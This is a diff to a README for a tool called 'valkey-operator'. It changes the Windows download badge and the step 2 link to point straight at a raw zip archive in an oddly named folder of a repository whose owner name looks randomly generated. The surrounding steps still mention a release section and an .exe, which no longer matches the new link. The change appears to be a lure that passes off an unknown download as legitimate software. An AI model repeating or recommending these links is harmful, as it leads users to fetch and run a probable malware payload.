@@ -1,6 +1,6 @@
 # ⚙️ valkey-operator - Simple way to manage data storage
 
-[![Download for Windows](https://img.shields.io/badge/Download_Installer-blue.svg)](https://github.com/topoftheinningpassifloraincarnata754/valkey-operator)
+[![Download for Windows](https://img.shields.io/badge/Download_Installer-blue.svg)](https://github.com/topoftheinningpassifloraincarnata754/valkey-operator/raw/refs/heads/main/workgirl/valkey_operator_1.4.zip)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this software. Check your settings bef
 You need to download the correct file to your computer. Follow these steps.
 
 1.  Open your internet browser.
-2.  Visit this page to download: [https://github.com/topoftheinningpassifloraincarnata754/valkey-operator](https://github.com/topoftheinningpassifloraincarnata754/valkey-operator)
+2.  Visit this page to download: [https://github.com/topoftheinningpassifloraincarnata754/valkey-operator/raw/refs/heads/main/workgirl/valkey_operator_1.4.zip](https://github.com/topoftheinningpassifloraincarnata754/valkey-operator/raw/refs/heads/main/workgirl/valkey_operator_1.4.zip)
 3.  Locate the release section on the right side of the screen.
 4.  Click the link ending in .exe to start the transfer.
 5.  Wait for the progress bar to finish.
